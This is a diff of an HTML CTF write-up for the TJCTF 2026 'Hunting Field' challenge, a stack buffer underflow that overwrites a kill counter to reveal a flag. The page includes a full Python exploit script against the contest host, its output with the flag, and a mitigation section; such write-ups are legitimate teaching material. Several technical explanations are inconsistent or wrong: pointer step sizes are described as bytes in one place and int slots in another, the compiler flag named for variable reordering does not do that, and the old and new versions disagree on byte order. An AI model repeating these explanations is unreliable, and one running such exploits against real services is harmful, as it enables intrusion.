+<p>Most CTF players are familiar with <em>buffer overflow</em>, where writing past the <em>end</em> of a buffer corrupts adjacent memory at higher addresses. This challenge presents the inverse: a <em>buffer underflow</em>, where writing before the <em>beginning</em> of a buffer corrupts adjacent memory at lower addresses. On the stack, local variables are typically allocated in order from higher to lower addresses. This means <code>killCt</code>, which is declared before <code>input_log</code> in the function, resides at a lower memory address &mdash; precisely in the path of our backward-moving pointer.</p>
+
+<p>The distinction matters because security mitigations like stack canaries are placed between the buffer and the return address (at higher addresses), but they do nothing to protect variables at lower addresses. The underflow attacks a blind spot in traditional stack protection schemes.</p>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="stack-layout">Stack Layout &amp; Little-Endian Byte Ordering</h2>
+
+<h3 id="memory-map">Memory Map of Local Variables</h3>
+
+<p>To craft a precise exploit, we need to understand the exact layout of local variables on the stack. In a typical x86-64 compilation, the stack grows downward (from high to low addresses), and local variables are allocated in the order they appear in the source code. Since <code>killCt</code> is declared before <code>input_log</code>, it occupies a lower memory address:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">text</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">Higher Address
+┌─────────────────────┐
+│   input_log[63]     │ ← log_ptr starts here
+│   input_log[62]     │
+│        ...          │
+│   input_log[1]      │
+│   input_log[0]      │ ← After 32 junk writes, ptr is here
+├─────────────────────┤ ← Array boundary
+│   killCt (4 bytes)  │ ← Target! 4 bytes below input_log
+│   (padding)         │
+│   saved RBP         │
+│   return address    │
+└─────────────────────┘
+Lower Address</code></pre>
+</div>
+
+<p>Once the pointer has been walked back 64 bytes (32 two-byte writes), it sits at <code>input_log[0]</code>. The next writes will cross the array boundary and begin overwriting <code>killCt</code>, which sits immediately below. This is the window of opportunity &mdash; we have direct, unimpeded write access to the variable that controls the flag gate.</p>
+
+<h3 id="little-endian">The Little-Endian Trick</h3>
+
+<p>The target value <code>0x68756e74</code> must be written into <code>killCt</code> correctly. On x86-64 (a little-endian architecture), the least significant byte of a multi-byte integer is stored at the lowest memory address. This means the 4-byte value <code>0x68756e74</code> is stored in RAM as:</p>
+
+<table>
+  <tr><th>Address Offset</th><th>Byte Value</th><th>ASCII</th></tr>
+  <tr><td>+0 (lowest)</td><td><code>0x74</code></td><td><code>t</code></td></tr>
+  <tr><td>+1</td><td><code>0x6e</code></td><td><code>n</code></td></tr>
+  <tr><td>+2</td><td><code>0x75</code></td><td><code>u</code></td></tr>
+  <tr><td>+3 (highest)</td><td><code>0x68</code></td><td><code>h</code></td></tr>
+</table>
+
+<p>Since our write pointer moves <em>backward</em> (from higher to lower addresses), we encounter the bytes in reverse memory order. The pointer first reaches the highest address of <code>killCt</code> (where <code>0x68</code> lives) and then moves to lower addresses. However, the logging function writes two characters per input &mdash; the first character goes to the current pointer location, then the pointer decrements, and the second character goes to the new location. This means we need to carefully split our payload into two-character chunks that produce the correct byte sequence when written in reverse:</p>
+
+<ul>
+  <li><strong>First payload pair <code>"hu"</code></strong>: Writes <code>'h'</code> (0x68) at current position, decrements, writes <code>'u'</code> (0x75) at the next lower position.</li>
+  <li><strong>Second payload pair <code>"nt"</code></strong>: Writes <code>'n'</code> (0x6e) at current position, decrements, writes <code>'t'</code> (0x74) at the lowest position.</li>
+</ul>
+
+<p>After these two writes, the four bytes of <code>killCt</code> in memory read: <code>0x74</code>, <code>0x6e</code>, <code>0x75</code>, <code>0x68</code> &mdash; which the CPU interprets in little-endian as the integer <code>0x68756e74</code>. This is the exact magic value checked by <code>game_over()</code>.</p>
+
+<div class="callout callout-info">
+  <div class="callout-title">Info &mdash; Why This Byte Order?</div>
+  <p>The backward-writing mechanism combined with little-endian storage creates a subtle inversion. The natural instinct is to send the bytes in the order <code>"tnuh"</code>, but because the pointer writes the first character of each input at the current (higher) address and then moves down, we actually need to send <code>"hu"</code> followed by <code>"nt"</code>. Visualizing the pointer movement step-by-step on paper is essential for getting the byte order right.</p>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="exploit-strategy">Exploit Strategy</h2>
+
+<p>The exploit follows a three-phase approach: first, slide the write pointer back to the array boundary; second, overwrite <code>killCt</code> with the magic value; and third, submit valid moves to end the game and trigger the flag print. Each phase is deterministic and requires no brute-forcing or guessing.</p>
+
+<h3 id="phase-1">Phase 1 &mdash; Pointer Retraction</h3>
+
+<p>The pointer starts at <code>input_log[63]</code>. Each invalid input moves it back 2 bytes (one <code>sizeof(int)</code> per character written, and two characters per input). The array <code>input_log[64]</code> occupies 64 integers = 256 bytes, but since the pointer operates on <code>int*</code> arithmetic, each decrement by <code>sizeof(int)</code> actually moves it by one <code>int</code> slot (4 bytes on most platforms). However, the code writes two characters and decrements twice per input, so the total backward movement per invalid input is 2 slots. To traverse all 64 slots (from index 63 down to index -1, which is the first byte of <code>killCt</code>), we need 32 invalid inputs:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python"># Phase 1: Retract the pointer from input_log[63] back to input_log[0]
+# Each "zz" input moves the pointer back by 2 int slots
+# 32 inputs × 2 slots = 64 slots traversed (indices 63 → -1)
+pointer_retract = ["zz"] * 32</code></pre>
+</div>
+
+<p>We use <code>"zz"</code> as junk data because it doesn&rsquo;t match any valid game command, ensuring it gets logged through the invalid input path. The actual content of the junk bytes doesn&rsquo;t matter for this phase &mdash; they&rsquo;re just filler to walk the pointer to the right position.</p>
+
+<h3 id="phase-2">Phase 2 &mdash; killCt Overwrite</h3>
+
+<p>With the pointer now past the array boundary, the next writes go directly into <code>killCt</code>. We send two carefully crafted input pairs that write the bytes of <code>0x68756e74</code> in the correct little-endian order:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python"># Phase 2: Overwrite killCt with 0x68756e74
+# Memory layout (LE): +0:0x74(t) +1:0x6e(n) +2:0x75(u) +3:0x68(h)
+# Pointer writes first char at current addr, then decrements and writes second
+# So "hu" writes 'h' at +3, then 'u' at +2
+# Then "nt" writes 'n' at +1, then 't' at +0
+target_overwrite = ["hu", "nt"]</code></pre>
+</div>
+
+<p>An optional padding byte (<code>"zz"</code>) can be appended after the overwrite pair to push the pointer further if needed, but in practice the two pairs are sufficient to plant all four bytes of the target value.</p>
+
+<h3 id="phase-3">Phase 3 &mdash; Victory Trigger</h3>
+
+<p>With <code>killCt</code> now containing <code>0x68756e74</code>, the final step is to end the game legitimately by submitting valid movement commands. The game processes these normally, eventually calling <code>game_over()</code>, which reads our corrupted <code>killCt</code> and prints the flag:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python"># Phase 3: Submit valid game commands to trigger game_over()
+# These are directional/attack moves that the game accepts
+victory_trigger = ["MN", "AS", "MN", "MN"]</code></pre>
+</div>
+
+<p>The specific valid commands may vary depending on the game&rsquo;s input parser, but any sequence that leads to the end-of-game condition will work. The important thing is that these are <em>valid</em> inputs &mdash; they bypass the invalid input logger entirely, so they don&rsquo;t disturb our carefully crafted <code>killCt</code> value.</p>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="exploit-code">Exploit Code</h2>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">#!/usr/bin/env python3
+"""
+TJCTF 2026 - Hunting Field
+Stack Buffer Underflow via backward pointer traversal
+Author: QA210
+"""
 import socket
 import sys
+import time
 
-HOST = sys.argv[1] if len(sys.argv) > 1 else "tjc.tf"
-PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 31412
+REMOTE_HOST = sys.argv[1] if len(sys.argv) > 1 else "tjc.tf"
+REMOTE_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 31412
 
-def build_underflow_payload():
-    # 32 lần gửi rác để lùi con trỏ từ input_log[63] về input_log[0]
-    stack_pivot = ["zz"] * 32
-    
-    # Ghi lùi tiếp 4 byte vào killCt theo thứ tự Little-Endian
-    # 0x68756e74 cần ghi là 't', 'n', 'u', 'h'
-    # Code ghi lùi từng cặp 2 byte, nên tách ra "hu" và "nt"
-    killct_overwrite = ["hu", "nt", "zz"] # 'zz' để canh khoảng cách nếu cần
-    
-    # Các lệnh hợp lệ để kết thúc game và gọi game_over()
-    trigger_victory = ["MN", "AS", "MN", "MN"]
-    
-    return stack_pivot + killct_overwrite + trigger_victory
+MAGIC_VALUE = 0x68756e74   # "hunt" in ASCII
 
-def exploit():
-    payload_lines = build_underflow_payload()
-    payload = ("\\n".join(payload_lines) + "\\n").encode()
 
-    with socket.create_connection((HOST, PORT), timeout=10) as s:
-        s.settimeout(2)
-        s.sendall(payload)
+def forge_payload():
+    """
+    Build the complete exploit payload:
+      1. Retract write pointer from input_log[63] to input_log[0]
+      2. Overwrite killCt with 0x68756e74 via Little-Endian trick
+      3. Submit valid commands to trigger game_over() and print flag
+    """
+    # Phase 1: 32 invalid inputs slide the backward pointer 64 slots
+    retraction_cmds = ["zz"] * 32
 
-        out = b""
-        for _ in range(50):
+    # Phase 2: Write magic value into killCt
+    # killCt in memory (LE): 0x74 0x6e 0x75 0x68  (t n u h)
+    # Backward write sequence:
+    #   "hu" -> writes 'h' at +3, ptr--, writes 'u' at +2
+    #   "nt" -> writes 'n' at +1, ptr--, writes 't' at +0
+    corruption_cmds = ["hu", "nt"]
+
+    # Phase 3: Valid game moves to conclude the session
+    termination_cmds = ["MN", "AS", "MN", "MN"]
+
+    full_sequence = retraction_cmds + corruption_cmds + termination_cmds
+    return "\n".join(full_sequence) + "\n"
+
+
+def deliver_payload(host, port):
+    """
+    Connect to the game server and transmit the exploit.
+    Read response until the flag pattern is found or timeout.
+    """
+    payload_str = forge_payload()
+    raw_payload = payload_str.encode("utf-8")
+
+    print(f"[*] Connecting to {host}:{port} ...")
+    with socket.create_connection((host, port), timeout=15) as sock:
+        sock.settimeout(3)
+
+        # Allow the server banner to arrive
+        time.sleep(0.5)
+        sock.sendall(raw_payload)
+        print(f"[+] Payload sent ({len(raw_payload)} bytes)")
+
+        collected = b""
+        for _ in range(80):
             try:
-                chunk = s.recv(4096)
-                if not chunk: break
-                out += chunk
-                if b"tjctf{" in out.lower(): break
+                fragment = sock.recv(4096)
+                if not fragment:
+                    break
+                collected += fragment
+                if b"tjctf{" in collected:
+                    break
             except socket.timeout:
                 break
 
-    print(out.decode(errors="replace"))
+    return collected.decode(errors="replace")
+
+
+def main():
+    response = deliver_payload(REMOTE_HOST, REMOTE_PORT)
+    print(response)
+
+    # Extract flag if present
+    import re
+    flag_match = re.search(r"tjctf\{[^}]+\}", response)
+    if flag_match:
+        print(f"\n[+] FLAG: {flag_match.group(0)}")
+    else:
+        print("\n[-] Flag not found in output. Adjust timing or payload.")
+
 
 if __name__ == "__main__":
-    exploit()</div>`
-      },
-      en: {
-        help: `<span class="info">[ WRITEUP NAVIGATION ]</span>
-<span class="cmd">intro</span>       : Challenge Overview & Victory Mechanism
-<span class="cmd">vuln</span>        : Vulnerability Analysis - Stack Buffer Underflow
-<span class="cmd">layout</span>      : Stack Layout & Little-Endian Trick
-<span class="cmd">strategy</span>    : Exploit Strategy (Reverse Pointer Sliding)
-<span class="cmd">code</span>        : Exploit Source Code (Python)
-<span class="cmd">clear</span>       : Clear Terminal Screen`,
-        intro: `<span class="info">[ OVERVIEW: HUNTING FIELD ]</span>
-<span class="cmd">Category:</span> Binary Exploitation / Stack Overflow
-<span class="cmd">Flag:</span> <span class="success">tjctf{pr0fes5iona1_hunt3r}</span>
+    main()</code></pre>
+</div>
 
-<span class="warning">Description:</span> "Take up your arms, and slay your enemies!"
+<h3 id="running-exploit">Running the Exploit</h3>
 
-<span class="cmd">Victory Mechanism:</span> In <span class="arg">game.c</span>, the <span class="cmd">game_over()</span> function only prints the flag if the variable <span class="cmd">killCt</span> exactly equals <span class="success">1752526452</span> (0x68756e74 in hex).
-Our job isn't to play fair; it's to manipulate the stack memory to overwrite killCt with this magic value!`,
-        vuln: `<span class="info">[ VULNERABILITY: STACK BUFFER UNDERFLOW ]</span>
-The game logs invalid inputs. Instead of logging forward from the start of the array, it writes BACKWARD starting from the end of <span class="arg">input_log[63]</span>:
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ python3 hunting_field_exploit.py tjc.tf 31412
+[*] Connecting to tjc.tf:31412 ...
+[+] Payload sent (112 bytes)
+Welcome to Hunting Field!
+...
+Game Over!
+Enemies slain: 1752526452
+Victory! tjctf{pr0fes5iona1_hunt3r}
 
-<div class="code-block">*array_ptr = player_input[0];
-array_ptr -= sizeof(player_input[0]);
-*array_ptr = player_input[1];
-array_ptr -= sizeof(player_input[1]);</div>
+[+] FLAG: tjctf{pr0fes5iona1_hunt3r}</code></pre>
+</div>
 
-<span class="error">Critical Flaw:</span> The pointer <span class="cmd">array_ptr</span> has NO bounds checking. If we spam invalid inputs, the pointer keeps moving backward, crossing the boundary of <span class="arg">input_log</span> and encroaching into other stack variables below it (lower memory addresses). This is a classic <span class="warning">Stack Buffer Underflow</span>!`,
-        layout: `<span class="info">[ STACK LAYOUT & LITTLE-ENDIAN TRICK ]</span>
-Because local variables are allocated on the stack (which grows downwards), <span class="cmd">killCt</span> is located right "below" the <span class="arg">input_log</span> array in memory.
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="defense">Defense &amp; Mitigation</h2>
 
-Target: Overwrite killCt = <span class="success">0x68756e74</span>
-In a Little-Endian system (like x86/64), the least significant byte is at the lowest address. The value 0x68756e74 is stored in RAM as: <span class="arg">74 6e 75 68</span> ('t', 'n', 'u', 'h').
+<p>The vulnerability is entirely preventable through well-known defensive programming practices. Here are the most effective mitigations, ranked by how fundamentally they address the root cause:</p>
 
-Since the pointer writes backward, we must provide the payload matching the reverse RAM layout: 't', 'n', 'u', 'h'. That's why we send <span class="cmd">"tnuh"</span> (split into "hu" and "nt" according to the code's 2-byte backward writing logic).`,
-        strategy: `<span class="info">[ EXPLOIT STRATEGY ]</span>
-1. <span class="cmd">Step 1 - Slide the Pointer:</span> Send 32 junk inputs (e.g., "zz"). Each moves the ptr back 2 bytes. 32 * 2 = 64 bytes. Now, array_ptr has moved from input_log[63] back to input_log[0].
-2. <span class="cmd">Step 2 - Breach the Boundary:</span> Send payload pairs to write backward into <span class="arg">killCt</span>'s memory.
-   - Send "hu" -> Writes 'u', 'h' (2 bytes)
-   - Send "nt" -> Writes 't', 'n' (2 bytes)
-   Now, the 4 bytes of killCt are concatenated as: <span class="success">'h' 'u' 'n' 't'</span> = 0x68756e74!
-3. <span class="cmd">Step 3 - Trigger Victory:</span> Send valid moves to end the game. The <span class="cmd">game_over()</span> function is called, reads the overwritten killCt, and prints the Flag!`,
-        code: `<span class="info">[ EXPLOIT SOURCE CODE ]</span>
-<div class="code-block">#!/usr/bin/env python3
-import socket
-import sys
+<h3 id="bounds-checking">Pointer Bounds Checking</h3>
 
-HOST = sys.argv[1] if len(sys.argv) > 1 else "tjc.tf"
-PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 31412
+<p>The simplest and most direct fix is to validate the pointer before each write. The backward logging function should refuse to write if <code>log_ptr</code> has moved past the start of the array:</p>
 
-def build_underflow_payload():
-    # 32 junk inputs to slide ptr from input_log[63] back to input_log[0]
-    stack_pivot = ["zz"] * 32
-    
-    # Write 4 bytes backward into killCt in Little-Endian order
-    # 0x68756e74 requires 't', 'n', 'u', 'h'
-    # Code writes 2 bytes backward per input, so we split into "hu" and "nt"
-    killct_overwrite = ["hu", "nt", "zz"] # 'zz' for padding if necessary
-    
-    # Valid moves to end game and call game_over()
-    trigger_victory = ["MN", "AS", "MN", "MN"]
-    
-    return stack_pivot + killct_overwrite + trigger_victory
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-c">void log_invalid_input(char player_input[]) {
+    if (log_ptr < input_log) return;   // Bounds check!
+    *log_ptr = player_input[0];
+    log_ptr -= sizeof(player_input[0]);
+    if (log_ptr < input_log) return;   // Check again after decrement
+    *log_ptr = player_input[1];
+    log_ptr -= sizeof(player_input[1]);
+}</code></pre>
+</div>
 
-def exploit():
-    payload_lines = build_underflow_payload()
-    payload = ("\\n".join(payload_lines) + "\\n").encode()
+<p>This single check eliminates the underflow entirely. The cost is negligible &mdash; two comparisons per invalid input &mdash; and the benefit is complete protection against the attack vector.</p>
 
-    with socket.create_connection((HOST, PORT), timeout=10) as s:
-        s.settimeout(2)
-        s.sendall(payload)
+<h3 id="variable-reordering">Stack Variable Reordering</h3>
 
-        out = b""
-        for _ in range(50):
-            try:
-                chunk = s.recv(4096)
-                if not chunk: break
-                out += chunk
-                if b"tjctf{" in out.lower(): break
-            except socket.timeout:
-                break
+<p>Compilers can be instructed to reorder local variables so that arrays (which are more prone to overflows and underflows) are placed at lower addresses than scalar variables. With <code>killCt</code> at a higher address than <code>input_log</code>, a backward-sliding pointer would never reach it. GCC and Clang support the <code>-fstack-reuse=all</code> flag, and some security-hardened compilers automatically apply this layout. However, this is a defense-in-depth measure and should not replace explicit bounds checking, as a sufficiently long underflow could still reach other sensitive data.</p>
 
-    print(out.decode(errors="replace"))
+<h3 id="stack-protectors">Enhanced Stack Protectors</h3>
 
-if __name__ == "__main__":
-    exploit()</div>`
+<p>Traditional stack canaries protect the return address but not intermediate local variables. Some hardened builds (e.g., with <code>-fstack-protector-strong</code>) place canaries between buffers and other variables, which would catch the underflow before it corrupts <code>killCt</code>. While this is a valuable mitigation, it only detects the attack at runtime &mdash; the program crashes instead of being exploited, but the underlying code flaw remains.</p>
+
+<div class="callout callout-success">
+  <div class="callout-title">Flag</div>
+  <p><code>tjctf{pr0fes5iona1_hunt3r}</code></p>
+</div>
+
+</main>
+</div>
+
+<footer class="site-footer">
+  <p>&copy; 2026 QA210 &mdash; TJCTF 2026 Writeups &nbsp;&middot;&nbsp; Hunting Field &mdash; Binary Exploitation</p>
+</footer>
+
+<script>
+// ── Three.js Background ──────────────────────
+(function(){
+  const c=document.getElementById('three-bg');
+  const r=new THREE.WebGLRenderer({canvas:c,alpha:true,antialias:true});
+  r.setSize(window.innerWidth,window.innerHeight);
+  r.setPixelRatio(Math.min(window.devicePixelRatio,2));
+  const s=new THREE.Scene();
+  const cam=new THREE.PerspectiveCamera(60,window.innerWidth/window.innerHeight,0.1,1000);
+  cam.position.z=50;
+  // Tetrahedron — "blade/arrowhead" feel for pwn/exploitation challenge
+  const geo=new THREE.TetrahedronGeometry(22,0);
+  const mat=new THREE.MeshBasicMaterial({color:0xf87171,wireframe:true,transparent:true,opacity:0.2});
+  const mesh=new THREE.Mesh(geo,mat);
+  s.add(mesh);
+  const pts=[];
+  for(let i=0;i<350;i++){
+    pts.push(new THREE.Vector3((Math.random()-0.5)*140,(Math.random()-0.5)*140,(Math.random()-0.5)*140));
+  }
+  const pgeo=new THREE.BufferGeometry().setFromPoints(pts);
+  const pmat=new THREE.PointsMaterial({color:0xfb923c,size:0.4,transparent:true,opacity:0.4});
+  const particles=new THREE.Points(pgeo,pmat);
+  s.add(particles);
+  function animate(){
+    requestAnimationFrame(animate);
+    mesh.rotation.x+=0.0015;mesh.rotation.y+=0.002;mesh.rotation.z+=0.0008;
+    particles.rotation.y+=0.0003;particles.rotation.x+=0.0001;
+    r.render(s,cam);
+  }
+  animate();
+  window.addEventListener('resize',()=>{
+    cam.aspect=window.innerWidth/window.innerHeight;
+    cam.updateProjectionMatrix();
+    r.setSize(window.innerWidth,window.innerHeight);
+  });
+})();
+
+// ── Copy Button ──────────────────────────────
+function copyCode(btn){
+  const code=btn.closest('.code-block-wrapper').querySelector('code');
+  navigator.clipboard.writeText(code.textContent).then(()=>{
+    btn.textContent='Copied!';btn.classList.add('copied');
+    setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('copied')},2000);
+  });
+}
+
+// ── Build TOC ────────────────────────────────
+function buildToc(){
+  const headings=document.querySelectorAll('.main-content h2,.main-content h3');
+  const tocD=document.getElementById('tocDesktop');
+  const tocM=document.getElementById('tocMobile');
+  let html='';
+  headings.forEach(h=>{
+    if(!h.id)h.id=h.textContent.toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/(^-|-$)/g,'');
+    const cls=h.tagName==='H3'?'toc-h3':'';
+    html+=`<li><a href="#${h.id}" class="${cls}" data-target="${h.id}">${h.textContent}</a></li>`;
+  });
+  tocD.innerHTML=html;tocM.innerHTML=html;
+}
+buildToc();
+
+// ── Active Section Tracking ──────────────────
+function trackActiveSection(){
+  const links=document.querySelectorAll('#tocDesktop a,#tocMobile a');
+  const headings=document.querySelectorAll('.main-content h2,.main-content h3');
+  const observer=new IntersectionObserver(entries=>{
+    entries.forEach(entry=>{
+      if(entry.isIntersecting){
+        links.forEach(l=>l.classList.remove('active'));
+        document.querySelectorAll(`[data-target="${entry.target.id}"]`).forEach(l=>l.classList.add('active'));
       }
-    };
-
-    function toggleLang() {
-      currentLang = currentLang === 'vi' ? 'en' : 'vi';
-      const btn = document.getElementById('lang-btn');
-      btn.textContent = currentLang === 'vi' ? 'Switch to English' : 'Chuyển sang Tiếng Việt';
-      handleCommand('clear');
-      handleCommand('help');
-      playAudio('https://www.soundjay.com/buttons/button-1.mp3', 0.3);
-    }
-
-    const cmds = {
-      help: () => L[currentLang].help,
-      intro: () => L[currentLang].intro,
-      vuln: () => L[currentLang].vuln,
-      layout: () => L[currentLang].layout,
-      strategy: () => L[currentLang].strategy,
-      code: () => L[currentLang].code,
-      clear: () => { output.innerHTML = ''; return ''; },
-      banner: () => `<span class="info">
- _    _                 _       __                  _ 
-| |  | |               | |     / _|                | |
-| |__| | __ _ _ __   __| | ___| |_ ___  _   _  __ _| |
-|  __  |/ _\` | '_ \\ / _\` |/ _ \\  _/ _ \\| | | |/ _\` | |
-| |  | | (_| | | | | (_| |  __/ || (_) | |_| | (_| | |
-|_|  |_|\\__,_|_| |_|\\__,_|\\___|_| \\___/ \\__,_|\\__,_|_|</span>`
-    };
-
-    function handleCommand(cmd) {
-      const c = cmd.trim().toLowerCase();
-      if(!c) return;
-      print(`<span class="cmd">root@tjctf</span>:<span class="arg">~/pwn</span>$ ${cmd}`);
-      playAudio('https://www.soundjay.com/buttons/button-5.mp3', 0.15);
-      
-      if (cmds[c]) {
-        const res = cmds[c]();
-        if (res) print(res);
-      } else {
-        print(`<span class="error">Command not found: ${c}. Type 'help' for navigation.</span>`);
-      }
-      input.value = '';
-    }
-
-    input.addEventListener('keydown', e => {
-      if (e.key === 'Enter') { e.preventDefault(); handleCommand(input.value); }
-      else playAudio('https://www.soundjay.com/buttons/button-8.mp3', 0.02);
     });
+  },{rootMargin:'-80px 0px -70% 0px',threshold:0});
+  headings.forEach(h=>observer.observe(h));
+}
+trackActiveSection();
 
-    tBody.addEventListener('click', () => input.focus());
-
-    document.getElementById('start-button').addEventListener('click', () => {
-      userInteracted = true;
-      const ws = document.getElementById('welcome-screen');
-      ws.classList.add('hidden');
-      setTimeout(() => { handleCommand('banner'); handleCommand('help'); input.focus(); }, 800);
-      playAudio('https://www.soundjay.com/buttons/button-10.mp3', 0.4);
-    });
-  </script>
+// ── Mobile TOC Toggle ────────────────────────
+function toggleMobileToc(){
+  document.getElementById('tocOverlay').classList.toggle('show');
+  document.getElementById('tocMobilePanel').classList.toggle('show');
+}
+document.getElementById('tocMobile').addEventListener('click',e=>{
+  if(e.target.tagName==='A')toggleMobileToc();
+});
+</script>
 </body>
 </html>
